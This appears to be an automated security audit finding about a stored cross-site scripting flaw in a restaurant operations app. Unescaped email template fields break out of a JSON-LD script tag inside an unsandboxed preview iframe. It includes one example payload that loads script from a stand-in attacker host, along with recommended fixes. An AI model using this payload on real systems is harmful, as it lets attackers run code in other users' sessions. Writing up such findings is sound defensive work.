# [HIGH] Stored XSS through email template JSON-LD preview

**File:** [`src/app/api/ops/restaurants/[id]/email-templates/[templateKey]/route.ts`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/src/app/api/ops/restaurants/[id]/email-templates/[templateKey]/route.ts#L33-L42) (lines 33, 39, 42)
**Project:** nabatableLP
**Severity:** HIGH • **Confidence:** high • **Slug:** `xss`

## Owners

**Suggested assignee:** `159779640+amanshresthaa@users.noreply.github.com` _(via last-committer)_

## Finding

PATCH validates and persists template variants, but the schema permits '<' and '</script>' in fields such as ctaLabel. Those saved values later flow into renderAnnotationScript, which embeds annotation.actionName via JSON.stringify inside a <script type="application/ld+json"> without escaping '<' (server/emails/base.ts:94). The ops email preview renders preview.html in an unsandboxed srcDoc iframe (src/components/features/email-templates/EmailTemplatesPreviewPane.tsx:179), so a payload like </script><script src=//attacker.example/x></script> can break out of the JSON-LD script and execute in the app origin when another ops user views the preview.

## Recommendation

Use a safe JSON serializer for script contexts, e.g. JSON.stringify(data).replace(/</g, '\\u003c'), and sandbox the preview iframe without script or same-origin privileges unless scripts are required. If email templates are plain text only, also reject '<' in stored template fields.

## Recent committers (`git log`)

- amanshresthaa <159779640+amanshresthaa@users.noreply.github.com> (2026-04-01)
